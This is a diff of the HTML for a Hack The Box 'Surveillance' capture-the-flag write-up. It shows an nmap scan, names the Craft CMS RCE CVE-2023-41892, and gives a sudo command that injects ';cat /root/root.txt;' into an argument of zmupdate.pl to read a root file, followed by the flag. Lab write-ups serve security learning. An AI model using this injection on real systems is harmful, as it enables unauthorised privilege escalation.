@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='HTB surveillance Writeup for htb surveillnace box
 rated: medium category: web
 Nmap Scan
-1 2 3 4 5 6 7 8 9 10 11 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT Nmap scan report for 10.10.11.245 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.'>
+1 2 3 4 5 6 7 8 9 10 11 12  Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT Nmap scan report for 10.10.11.245 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.'>
 <title>Htb_surveillance</title>
 
 <link rel='canonical' href='https://f0rk3b0mb.github.io/p/htb_surveillance/'>
@@ -13,7 +13,7 @@ Nmap Scan
 <meta property='og:description' content='HTB surveillance Writeup for htb surveillnace box
 rated: medium category: web
 Nmap Scan
-1 2 3 4 5 6 7 8 9 10 11 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT Nmap scan report for 10.10.11.245 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.'>
+1 2 3 4 5 6 7 8 9 10 11 12  Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT Nmap scan report for 10.10.11.245 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.'>
 <meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb_surveillance/'>
 <meta property='og:site_name' content='f0rk3b0mb'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-02-28T22:44:28&#43;03:00'/><meta property='article:modified_time' content='2024-02-28T22:44:28&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/htb.svg' />
@@ -22,7 +22,7 @@ Nmap Scan
 <meta name="twitter:description" content="HTB surveillance Writeup for htb surveillnace box
 rated: medium category: web
 Nmap Scan
-1 2 3 4 5 6 7 8 9 10 11 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT Nmap scan report for 10.10.11.245 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed."><meta name="twitter:card" content="summary_large_image">
+1 2 3 4 5 6 7 8 9 10 11 12  Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT Nmap scan report for 10.10.11.245 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1."><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/htb.svg' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
 <script>
@@ -448,20 +448,22 @@ category: web</p>
 </span><span class="lnt"> 9
 </span><span class="lnt">10
 </span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT
-</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.245
-</span></span><span class="line"><span class="cl">Host is up (0.30s latency).
-</span></span><span class="line"><span class="cl">Not shown: 998 closed ports
-</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 59.76 seconds
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT
+Nmap scan report for 10.10.11.245
+Host is up (0.30s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.76 seconds
+
+</code></pre></td></tr></table>
 </div>
 </div><p>A cms is running in port 80 , craft cms</p>
 <p>It is vulnerable to rce CVE-2023-41892</p>
@@ -479,10 +481,14 @@ category: web</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo /usr/bin/zmupdate.pl -v 1.19.0 -u &#34;;cat /root/root.txt;&#34;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">sudo /usr/bin/zmupdate.pl -v 1.19.0 -u &#34;;cat /root/root.txt;&#34;
+
+
+</code></pre></td></tr></table>
 </div>
 </div><p>root.txt 13630834b0c9c6f122557097788d8e25</p>
 
